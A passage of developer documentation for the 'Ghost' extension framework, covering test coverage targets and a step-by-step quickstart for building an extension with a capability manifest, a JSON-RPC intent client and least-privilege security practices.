| Component                  | Coverage Target | Test File(s)                     |
|----------------------------|-----------------|----------------------------------|
| Intercept Layer            | 100%            | `intercept.test.js`              |
| Authorization Layer        | 100%            | `auth.test.js`                   |
| Rate Limiting (trTCM)      | 100%            | `token-bucket.test.js`           |
| Audit Layer                | 95%+            | `audit.test.js`                  |
| Execution Layer            | 90%+            | `circuit-breaker.test.js`        |
| Full Pipeline              | 95%+            | `pipeline.test.js`               |
| Git Extension              | 85%+            | Extension integration tests      |
| Manifest Validation        | 100%            | `extension-loader.test.js`       |

### Continuous Testing

```bash
# Run all tests
npm test

# Run specific test suites
npm test -- test/auth.test.js
npm test -- test/pipeline.test.js

# Run with coverage
npm test -- --coverage

# Watch mode for development
npm test -- --watch
```

---

## Extension Developer Quickstart

This guide shows how to build a Ghost extension using the Git extension as the canonical reference implementation.

### Step 1: Project Setup

```bash
# Create extension directory
mkdir my-extension
cd my-extension

# Initialize package
npm init -y

# Install SDK
npm install @ghost/extension-sdk
```

### Step 2: Create Manifest

**File**: `manifest.json`

```json
{
  "id": "my-extension",
  "name": "My Extension",
  "version": "1.0.0",
  "description": "Extension description",
  "main": "index.js",
  "capabilities": {
    "filesystem": {
      "read": ["src/**/*.js"],
      "write": ["dist/**"]
    },
    "network": {
      "allowlist": [
        "https://api.example.com"
      ],
      "rateLimit": {
        "cir": 60,
        "bc": 100,
        "be": 50
      }
    }
  },
  "permissions": [
    "filesystem:read",
    "filesystem:write",
    "network:https"
  ]
}
```

**Key Points**:
- **id**: Unique identifier (lowercase, alphanumeric, hyphens)
- **capabilities**: Declare all required permissions (fail-closed model)
- **rateLimit**: Set CIR (sustained rate), Bc (burst), Be (excess burst)

### Step 3: Implement RPC Client (Option A: Using SDK)

**File**: `index.js`

```javascript
const { ExtensionSDK } = require('@ghost/extension-sdk');

class MyExtension {
    constructor() {
        this.sdk = new ExtensionSDK('my-extension');
    }

    async initialize() {
        console.log('Extension initialized');
    }

    async processFiles(params) {
        try {
            // Read files using SDK
            const files = await this.sdk.requestFileReadDir({
                path: './src'
            });

            for (const file of files.filter(f => f.endsWith('.js'))) {
                const content = await this.sdk.requestFileRead({
                    path: `./src/${file}`
                });

                // Process content
                const processed = this.transform(content);

                // Write to dist
                await this.sdk.requestFileWrite({
                    path: `./dist/${file}`,
                    content: processed
                });
            }

            return {
                success: true,
                filesProcessed: files.length
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    transform(content) {
        // Your transformation logic
        return content.toUpperCase();
    }

    async shutdown() {
        console.log('Extension shutting down');
    }
}

module.exports = MyExtension;
```

### Step 4: Implement RPC Client (Option B: Custom Like Git Extension)

**File**: `extension.js`

```javascript
const path = require('path');

class ExtensionRPCClient {
    constructor(coreHandler) {
        this.coreHandler = coreHandler || this.defaultHandler;
        this.requestId = 0;
    }

    defaultHandler(method, params) {
        throw new Error(`No core handler registered for RPC call: ${method}`);
    }

    async call(method, params = {}) {
        const id = ++this.requestId;
        const request = {
            jsonrpc: "2.0",
            id,
            method,
            params
        };

        const response = await this.coreHandler(request);
        
        if (response.error) {
            throw new Error(`RPC Error: ${response.error.message}`);
        }
        
        return response.result;
    }

    async emitIntent(type, operation, params) {
        return await this.call('intent', {
            type,
            operation,
            params
        });
    }

    async requestFileRead(path, encoding = 'utf8') {
        return await this.emitIntent('filesystem', 'read', { path, encoding });
    }

    async requestFileWrite(path, content, encoding = 'utf8') {
        return await this.emitIntent('filesystem', 'write', { path, content, encoding });
    }

    async requestNetworkCall(options, payload) {
        return await this.emitIntent('network', 'request', { options, payload });
    }
}

class MyExtension {
    constructor(rpcClient) {
        this.rpc = rpcClient;
    }

    async myMethod(params) {
        // Use RPC client for all I/O
        const data = await this.rpc.requestFileRead('config.json');
        const parsed = JSON.parse(data);

        // Make API call
        const response = await this.rpc.requestNetworkCall({
            hostname: 'api.example.com',
            path: '/endpoint',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, { key: parsed.value });

        return { success: true, response };
    }

    async handleRPCRequest(request) {
        try {
            const { method, params = {} } = request;
            let result;

            switch (method) {
                case 'my.method':
                    result = await this.myMethod(params);
                    break;
                default:
                    throw new Error(`Unknown method: ${method}`);
            }

            return {
                jsonrpc: "2.0",
                id: request.id,
                result
            };
        } catch (error) {
            return {
                jsonrpc: "2.0",
                id: request.id,
                error: {
                    code: -32603,
                    message: error.message
                }
            };
        }
    }
}

function createExtension(coreHandler) {
    const rpcClient = new ExtensionRPCClient(coreHandler);
    return {
        handleRequest: (req) => new MyExtension(rpcClient).handleRPCRequest(req),
        rpcClient
    };
}

module.exports = { createExtension, ExtensionRPCClient, MyExtension };
```

### Step 5: Validate Manifest

```bash
ghost extension validate ./manifest.json

# Expected output:
✓ Manifest is valid
✓ All capability declarations are well-formed
✓ Rate limit configuration is valid (CIR=60, Bc=100, Be=50)
```

### Step 6: Test Locally

```javascript
// test.js
const { createExtension } = require('./extension');

const mockCoreHandler = async (request) => {
    console.log('Core received:', request);
    // Mock response
    return {
        jsonrpc: '2.0',
        id: request.id,
        result: 'mock result'
    };
};

const ext = createExtension(mockCoreHandler);

(async () => {
    const response = await ext.handleRequest({
        jsonrpc: '2.0',
        id: '1',
        method: 'my.method',
        params: {}
    });

    console.log('Response:', response);
})();
```

### Step 7: Install Extension

```bash
# Install to user extensions directory
ghost extension install .

# Verify installation
ghost extension list

# Expected output:
ID             Name            Version  Status
my-extension   My Extension    1.0.0    active
```

### Key Learnings from Git Extension

1. **Separation of Concerns**:
   - `ExtensionRPCClient`: Handles JSON-RPC communication
   - `GitExtension`: Implements business logic
   - Never mix I/O with logic

2. **Intent-Based I/O**:
   - All filesystem/network/git operations go through `emitIntent()`
   - Never use Node.js `fs`, `https`, or `child_process` directly
   - Pipeline enforces permissions at runtime

3. **Error Handling**:
   - Check response `success` field
   - Handle `PERMISSION_DENIED`, `RATE_LIMIT_EXCEEDED`, `AUDIT_FAILED` errors
   - Provide meaningful error messages to users

4. **Manifest Design**:
   - Request minimal capabilities (principle of least privilege)
   - Use narrow glob patterns for filesystem (`src/**/*.js` vs `**/*`)
   - Set rate limits based on actual usage patterns

5. **Security Best Practices**:
   - Never hardcode secrets (use environment variables)
   - Validate all user inputs before sending intents
   - Respect rate limits (implement exponential backoff if needed)

### Reference Git Extension Components

| Component                  | File                                      | Lines       | Purpose                          |
|----------------------------|-------------------------------------------|-------------|----------------------------------|
| Manifest                   | `manifest.json`                           | 1-50        | Capability declarations          |
| RPC Client                 | `extension.js`                            | 11-135      | JSON-RPC communication           |
| Git Logic                  | `extension.js`                            | 137-1154    | Business logic                   |
| Commit Generation          | `extension.js` (generateCommit)           | 509-536     | AI-powered commit messages       |
| Security Scanning          | `extension.js` (scanForSecrets)           | 302-370     | Entropy + regex-based detection  |
| Version Management         | `extension.js` (handleVersionBump)        | 842-937     | Semver bumping                   |
| Merge Resolution           | `extension.js` (handleMergeResolve)       | 999-1078    | Conflict resolution strategies   |

---

## Conclusion

The Git Extension demonstrates Ghost's **Zero Trust** architecture with:

1. **Manifest-driven security**: All capabilities explicitly declared and enforced
2. **JSON-RPC intent system**: Clean separation between extension logic and I/O operations
3. **4-layer pipeline**: Intercept → Authorization → Audit → Execution
4. **Rate limiting**: Two-Rate Three-Color Marker (trTCM) for traffic policing
5. **Comprehensive testing**: Unit, integration, and end-to-end tests

**For Extension Developers**: Use the Git extension as your reference implementation. Follow the patterns for RPC client design, intent emission, and manifest declarations to build secure, performant Ghost extensions.

**Next Steps**:
- Review `docs/extension-api.md` for complete API reference
- Explore `core/pipeline/` for detailed pipeline implementation
- Study `test/` directory for testing best practices
- Reference `packages/extension-sdk/` for SDK usage

---

**Document Version**: 1.0.0  
**Last Updated**: Sprint 5  
**Canonical Reference**: `extensions/ghost-git-extension/`
